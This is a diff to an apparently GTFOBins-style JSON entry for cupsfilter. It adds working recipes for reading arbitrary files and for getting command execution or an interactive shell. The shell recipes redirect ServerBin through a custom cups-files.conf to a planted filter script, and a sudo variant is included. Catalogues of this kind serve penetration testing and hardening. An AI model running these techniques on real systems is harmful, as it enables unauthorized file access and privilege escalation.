@@ -2,20 +2,28 @@
   "functions": {
     "file-read": [
       {
-        
-        "code": "LFILE=file_to_read\ncupsfilter -i application/octet-stream -m application/octet-stream $LFILE\n"
+        "code": "cupsfilter -i application/octet-stream -m application/octet-stream /path/to/input-file\n",
+        "contexts": {
+          "sudo": null,
+          "suid": null,
+          "unprivileged": null
+        }
+      }
+    ],
+    "shell": [
+      {
+        "description": "The `-c` flag allows specifying a custom `cups-files.conf` to redirect `ServerBin` to a user-controlled directory. By placing a filter script (like `gziptoany`) in that directory, arbitrary commands can be executed.\n",
+        "code": "COMMAND='id'\nWORKDIR=$(mktemp -d)\nmkdir -p \"$WORKDIR/cups/filter\"\nprintf '#!/bin/sh\\n%s\\n' \"$COMMAND\" > \"$WORKDIR/cups/filter/gziptoany\"\nchmod +x \"$WORKDIR/cups/filter/gziptoany\"\nprintf 'ServerBin %s/cups\\nDataDir /usr/share/cups' \"$WORKDIR\" > \"$WORKDIR/cups-files.conf\"\ncupsfilter -c \"$WORKDIR/cups-files.conf\" -i text/plain -m text/plain /dev/null 2>/dev/null\n"
+      },
+      {
+        "description": "Spawning an interactive system shell using the `ServerBin` redirection technique.\n",
+        "code": "WORKDIR=$(mktemp -d)\nmkdir -p \"$WORKDIR/cups/filter\"\nprintf '#!/bin/sh\\nexec /bin/sh' > \"$WORKDIR/cups/filter/gziptoany\"\nchmod +x \"$WORKDIR/cups/filter/gziptoany\"\nprintf 'ServerBin %s/cups\\nDataDir /usr/share/cups' \"$WORKDIR\" > \"$WORKDIR/cups-files.conf\"\ncupsfilter -c \"$WORKDIR/cups-files.conf\" -i text/plain -m text/plain /dev/null 2>/dev/null\n"
       }
     ],
     "sudo": [
       {
-        
-        "code": "LFILE=file_to_read\nsudo cupsfilter -i application/octet-stream -m application/octet-stream $LFILE\n"
-      }
-    ],
-    "suid": [
-      {
-        
-        "code": "LFILE=file_to_read\n./cupsfilter -i application/octet-stream -m application/octet-stream $LFILE\n"
+        "description": "The file read primitive works directly via sudo. For command execution, `cupsfilter` calls `_cupsFileCheck` when running as root, requiring the custom config file to be owned by root.\n",
+        "code": "sudo cupsfilter -i application/octet-stream -m application/octet-stream FILE\n"
       }
     ]
   }
